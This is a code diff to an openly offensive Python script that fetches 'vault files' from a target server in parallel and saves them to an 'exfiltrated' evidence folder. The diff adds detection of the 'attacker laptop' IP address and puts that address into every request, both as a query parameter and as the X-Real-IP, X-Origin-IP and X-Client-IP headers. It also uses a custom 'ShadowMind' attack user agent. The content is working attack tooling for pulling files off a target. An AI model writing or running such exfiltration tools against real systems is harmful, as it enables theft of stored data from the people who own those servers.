@@ -9,9 +9,21 @@
 import sys
 import time
 import os
+import socket
 import concurrent.futures
 import urllib.request
 import urllib.error
+
+def get_attacker_ip():
+    """Detect the attacker laptop's local IPv4 address."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "10.28.82.21"
 
 # =============================================================================
 # 1. CONFIGURATION: TARGET URL & VAULT FILES (EASILY CHANGEABLE)
@@ -72,11 +84,16 @@ OUTPUT_DIR = "exfiltrated_parallel_evidence"
 def exfiltrate_worker(item):
     thread_id, (label, endpoint) = item
     filename = endpoint.strip("/").split("/")[-1]
-    url = f"{TARGET_URL.rstrip('/')}{endpoint}"
+    attacker_ip = get_attacker_ip()
+    sep = "&" if "?" in endpoint else "?"
+    url = f"{TARGET_URL.rstrip('/')}{endpoint}{sep}src={attacker_ip}"
     
     headers = {
         "User-Agent": f"ShadowMind-ParallelBlitz/2.0 (Worker-{thread_id})",
         "X-Attack-Mode": "Parallel",
+        "X-Real-IP": attacker_ip,
+        "X-Origin-IP": attacker_ip,
+        "X-Client-IP": attacker_ip,
         "Accept": "*/*"
     }
     
